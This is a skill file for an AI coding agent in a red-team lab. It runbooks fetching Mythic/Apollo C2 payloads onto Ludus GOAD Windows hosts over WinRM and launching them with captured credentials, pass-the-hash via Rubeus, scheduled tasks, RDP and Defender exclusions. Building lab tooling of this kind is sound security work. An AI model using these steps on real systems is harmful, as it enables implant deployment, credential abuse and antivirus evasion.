---
name: sage-mythic-payload-deploy
description: Download an existing Mythic payload, stage it onto a Ludus Windows host over WinRM, and launch it as the current user or a supplied run-as user. Use when Codex needs to redeploy an Apollo/Sage/Mythic payload after Mythic has already built it, recover a dead GOAD callback without resetting Mythic, or help create a fresh callback by pulling a payload from Mythic to CASTELBLACK/BRAAVOS/another Ludus host.
---

# Sage Mythic Payload Deploy

## Overview

Use the bundled script for deterministic payload redeploys from Mythic into the Ludus GOAD range. Keep passwords out of scripts: Mythic auth comes from `MYTHIC_ADMIN_PASSWORD` or `/home/john/dev/mythic/.env`, Ludus API auth comes from `.mcp.json`, and target run-as credentials come from `--run-as-password`, `SAGE_RUN_AS_PASSWORD`, or Mythic's credential store.

## Workflow

1. Confirm Mythic has the payload:

```bash
.venv/bin/python skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py list-payloads --payload-type apollo
```

If a run-as password should come from Mythic, inspect credential metadata without printing secrets:

```bash
.venv/bin/python skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py list-credentials --account samwell
```

2. Deploy the payload. For GOAD, prefer the Tailscale IP as `--serve-host` when the range cannot reach the local VM bridge IP.

```bash
SAGE_RUN_AS_PASSWORD='<password>' \
.venv/bin/python skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py deploy \
  --payload-type apollo \
  --target-host CASTELBLACK \
  --serve-host 100.x.y.z \
  --run-as-user 'NORTH\samwell.tarly'
```

Use Mythic's credential store instead of an environment variable when the credential has already been captured:

```bash
.venv/bin/python skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py deploy \
  --payload-type apollo \
  --target-host CASTELBLACK \
  --serve-host 100.x.y.z \
  --run-as-user 'NORTH\samwell.tarly' \
  --run-as-credential-account samwell.tarly \
  --run-as-credential-realm north.sevenkingdoms.local
```

For the clean-baseline CASTELBLACK foothold, use the interactive launch path instead of `auto`. Open an RDP
session as `NORTH\samwell.tarly`, then launch the staged payload through that active desktop session:

```bash
printf '%s\n' "$SAGE_RUN_AS_PASSWORD" | xfreerdp3 \
  /from-stdin:force /u:'NORTH\samwell.tarly' /v:10.4.10.22 \
  /cert:ignore /sec:nla /w:1024 /h:768 /log-level:ERROR
```

```bash
.venv/bin/python skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py deploy \
  --payload-type apollo \
  --target-host CASTELBLACK \
  --serve-host 100.x.y.z \
  --run-as-user 'NORTH\samwell.tarly' \
  --launch-method scheduled-task-interactive \
  --add-defender-exclusion \
  --wait-callbacks-seconds 60
```

3. Rediscover callbacks with the live-runner skill or Sage task helper after launch. Do not trust historical callback IDs.

## Script Notes

- `--payload-uuid` selects a specific Mythic payload. Without it, the script picks the newest successful payload of `--payload-type`.
- `--target-host`, `--target-ip`, and `--ludus-host` select the Ludus inventory host. `--target-host CASTELBLACK` is the normal GOAD foothold redeploy.
- `--serve-host` must be an address reachable from the Windows target. In this lab that is often the operator host's Tailscale IP.
- `--run-as-credential-account` and `--run-as-credential-realm` resolve a plaintext/password credential from Mythic and do not print the secret.
- `list-credentials` redacts credential material and is safe to use for account/realm/type discovery.
- `--launch-method scheduled-task-interactive` waits for an active interactive session for `--run-as-user`, then
  registers and starts a scheduled task with `LogonType Interactive`. This is the normal clean-baseline
  CASTELBLACK bootstrap path. Unless overridden with `--remote-path` or `--remote-filename`, it preserves the
  payload filename on disk, so the normal Apollo path is `C:\Users\Public\apollo.exe`.
- After a new callback is observed, `scheduled-task-interactive` disconnects the RDP session with `tsdiscon` by
  default. This closes the local RDP client without logging off the Windows session, so Apollo remains running.
  Use `--no-disconnect-interactive-session` only when keeping the desktop open is intentional.
- `--add-defender-exclusion` adds a narrow Defender `ExclusionPath` for only the staged payload file before
  transfer. Use it only for operator-owned foothold bootstrap on the lab range; clean-baseline Defender otherwise
  quarantines stock Apollo after it starts.
- `--launch-method scheduled-task-s4u` creates a passwordless scheduled task with `/NP`. Use it when only a hash exists and the callback needs a local process token for the named domain user; expect no reusable password-backed network logon from that task itself.
- `--launch-method rubeus-asktgt-netonly` stages `Rubeus.exe`, resolves a hash from Mythic, and runs `asktgt /createnetonly:<payload> /ptt`. Use it when plaintext is unavailable but a hash exists.
- `--launch-method auto` first tries `Start-Process -Credential` for run-as launches and falls back to a scheduled task if Windows denies that path.
- The script writes downloads under `/tmp/sage_payloads` by default and stages remote files under `C:\Users\Public`. It never deletes local files, remote files, Mythic objects, or Sage/Phoenix databases.

Read or patch `scripts/deploy_payload_via_ludus.py` only when the deployment mechanics need adjustment.
